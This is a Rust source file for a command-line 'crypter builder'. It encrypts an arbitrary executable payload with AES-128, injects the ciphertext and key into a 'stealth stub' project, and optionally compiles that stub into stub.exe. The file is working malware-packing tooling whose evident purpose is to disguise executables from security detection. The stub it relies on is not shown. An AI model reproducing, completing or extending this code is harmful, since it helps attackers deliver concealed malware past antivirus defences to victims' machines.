use clap::Parser;
use common::{encrypt_aes128, KEY_SIZE};
use rand::{RngCore, SeedableRng, rngs::StdRng};
use std::fs::{self, read, File};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Parser, Debug)]
#[command(author, version, about = "Modern Rust Crypter Builder", long_about = None)]
struct Args {
    /// Path to the executable payload to encrypt
    #[arg(short, long)]
    input: String,

    /// Automatically compile the stealth stub in release mode
    #[arg(short, long, default_value_t = false)]
    build: bool,
}

fn main() -> std::io::Result<()> {
    // Elegant banner
    println!(r#"
    
    ██████╗ ██╗   ██╗███████╗████████╗     ██████╗██████╗ ██╗   ██╗██████╗ ████████╗███████╗██████╗ 
    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝    ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
    ██████╔╝██║   ██║███████╗   ██║       ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   █████╗  ██████╔╝
    ██╔══██╗██║   ██║╚════██║   ██║       ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██╔══╝  ██╔══██╗
    ██║  ██║╚██████╔╝███████║   ██║       ╚██████╗██║  ██║   ██║   ██║        ██║   ███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                                    
    "#);

    let args = Args::parse();
    
    let input_path = Path::new(&args.input);
    if !input_path.exists() {
        eprintln!("[!] ERROR: Input file '{}' not found.", args.input);
        std::process::exit(1);
    }
    
    let plaintext_bytes = read(input_path).expect("Failed to read input file");
    
    let stub_src_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../stub/src");
    if !stub_src_dir.exists() {
        fs::create_dir_all(&stub_src_dir)?;
    }
    
    let encrypted_file_path = stub_src_dir.join("encrypted.bin");
    let key_file_path = stub_src_dir.join("key.txt");
    
    println!("[>] Processing: {}", input_path.file_name().unwrap_or_default().to_string_lossy());
    println!("[>] Data Size:  {} bytes", plaintext_bytes.len());
    
    // 1. Key Generation
    println!("[*] Generating unique cryptographic key...");
    let mut key_bytes = [0u8; KEY_SIZE];
    let mut rng = StdRng::from_entropy();
    rng.fill_bytes(&mut key_bytes);
    
    // 2. Encryption
    println!("[*] Encrypting payload with AES-128...");
    let encrypted_bytes = encrypt_aes128(&plaintext_bytes, &key_bytes);
    
    // 3. Asset Injection
    println!("[*] Injecting assets into stealth stub...");
    let mut encrypted_file = File::create(&encrypted_file_path)?;
    encrypted_file.write_all(&encrypted_bytes)?;
    
    let mut key_file = File::create(&key_file_path)?;
    key_file.write_all(&key_bytes)?;
    
    println!("[+] Assets successfully prepared.");
    
    // 4. Compilation
    if args.build {
        println!("[*] Compiling stealth stub (Release Mode)...");
        let stub_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../stub");
        let status = Command::new("cargo")
            .current_dir(stub_dir)
            .args(&["build", "--release"])
            .status()?;
            
        if status.success() {
            println!("\n[SUCCESS] Stealth payload created: target\\release\\stub.exe");
        } else {
            eprintln!("\n[FAILURE] Compilation failed. Ensure all dependencies are met.");
        }
    } else {
        println!("\n[!] Use '-b' to automatically compile the final stub.");
    }
    
    Ok(())
}
